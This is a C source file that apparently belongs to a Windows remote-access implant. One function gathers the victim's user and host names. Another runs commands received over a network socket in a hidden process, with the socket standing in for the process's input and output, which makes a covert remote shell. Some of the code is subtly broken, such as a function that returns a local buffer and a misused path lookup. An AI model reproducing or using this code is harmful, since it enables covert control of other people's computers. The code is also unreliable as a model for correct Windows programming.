
/*
Author: Fahad (QuantumCore)
sys.c (c) 2020
Created:  2020-08-15T15:27:04.427Z
Modified: -
*/

#include "fhdawn.h"

char* UserPC()
{
	char username[UNLEN + 1];
	char hostname[MAX_COMPUTERNAME_LENGTH + 1];
	char* output[500];
	memset(output, 0, 500);
	DWORD len = UNLEN + 1;
	DWORD hlen = sizeof(hostname) / sizeof(hostname[0]);
	GetUserNameA(username, &len);
	GetComputerNameA(hostname, &hlen);
	snprintf(output, 500, "%s / %s", username, hostname);
	return output;
}


void ExecSock(void)
{
    STARTUPINFO sinfo;
	PROCESS_INFORMATION pinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = STARTF_USESTDHANDLES;
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) sockfd;
	if(CreateProcess(NULL, (LPSTR)recvbuf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo)){
		WaitForSingleObject(pinfo.hProcess, INFINITE);
		CloseHandle(pinfo.hProcess);
		CloseHandle(pinfo.hThread);
	}
}

void GetAbsolutePath(char* file, char* pathbuf[500])
{
	HANDLE F = CreateFile(file, FILE_READ_ONLY, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	int xf = GetModuleFileName(F, pathbuf, MAX_PATH);
	if (xf == 0)
	{
		memset(pathbuf, 0, 500);
		snprintf(pathbuf, 500, "Failed to get Absolute Path (Error %ld)", GetLastError());
	}
	CloseHandle(F);
}